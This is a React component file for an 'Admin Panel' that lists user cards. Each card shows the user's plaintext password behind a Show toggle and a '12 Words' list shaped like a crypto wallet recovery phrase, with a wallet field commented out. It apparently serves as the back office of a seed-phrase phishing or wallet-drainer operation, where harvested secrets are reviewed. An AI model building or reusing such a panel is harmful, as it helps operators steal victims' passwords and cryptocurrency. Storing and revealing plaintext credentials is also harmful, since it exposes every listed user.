
import { useState } from 'react'

function UserCard({ u }) {
  const [showPassword, setShowPassword] = useState(false)
  const created = u?.createdAt ? new Date(u.createdAt).toLocaleString() : '—'

  return (
    <div className="bg-[#070a11]/80 border border-white/5 rounded-lg p-4 shadow-sm">
      <div className="flex items-start justify-between gap-4">
        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <h3 className="text-lg font-semibold text-white">{u?.name || '—'}</h3>
          <p className="text-sm text-white/60">{u?.email || '—'}</p>
        </div>
        <div className="text-right ">
          <span className={`px-2 py-1 text-xs rounded ${u?.isAdmin ? 'bg-red-600 text-white' : 'bg-white/5 text-white/70'}`}>
            {u?.isAdmin ? 'Admin' : 'User'}
          </span>
        </div>
      </div>

      <div className="mt-3 grid grid-cols-1 gap-2 text-sm">
        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <span className="font-medium text-white/80">Password:</span>{' '}
          <span className="text-white/60">{showPassword ? (u?.password || '—') : '••••••••'}</span>
          <button type="button" onClick={() => setShowPassword((s) => !s)} className="ml-3 text-xs text-red-400">
            {showPassword ? 'Hide' : 'Show'}
          </button>
        </div>

        {/* <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <span className="font-medium text-white/80">Wallet:</span>{' '}
          <span className="text-white/60">{u?.wallet || '—'}</span>
        </div> */}

        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <span className="font-medium text-white/80">Created:</span>{' '}
          <span className="text-white/60">{created}</span>
        </div>

        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <span className="font-medium text-white/80">ID:</span>{' '}
          <span className="text-white/50 break-all text-xs">{u?.id}</span>
        </div>

        <div className='border border-gray-500/30 rounded-2xl p-2 w-full'>
          <span className="font-medium text-white/80">12 Words:</span>
          {Array.isArray(u?.words) && u.words.length > 0 ? (
            <ol className="mt-2 grid grid-cols-2 sm:grid-cols-3 gap-2 list-decimal list-inside">
              {u.words.map((w, i) => (
                <li key={i} className="text-white/60 bg-white/5 px-2 py-1 rounded">{w}</li>
              ))}
            </ol>
          ) : (
            <div className="text-white/50 mt-1">No words</div>
          )}
        </div>
      </div>
    </div>
  )
}

export default function AdminPanel({ adminUsers = [] }) {
  const isError = typeof adminUsers === 'string'

  return (
    <div className="pt-24 px-4">
      <div className="max-w-6xl mx-auto">
        <h1 className="text-4xl font-bold mb-6 text-center">Admin Panel</h1>

          <p className="text-white/60 !mb-6 text-center">List of admins, users and details. Click <q className='!text-[#A20203] font-bold'>Show</q> to reveal passwords when necessary.</p>
        <div className="bg-[#070a11]/90 backdrop-blur-lg border border-white/10 rounded-lg p-6">

          {isError ? (
            <p className="text-red-400">{adminUsers}</p>
          ) : adminUsers.length === 0 ? (
            <p className="text-white/60">No admin users found.</p>
          ) : (
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              {adminUsers.map((u) => (
                <UserCard key={u.id} u={u} />
              ))}
            </div>
          )}
        </div>
      </div>
    </div>
  )
}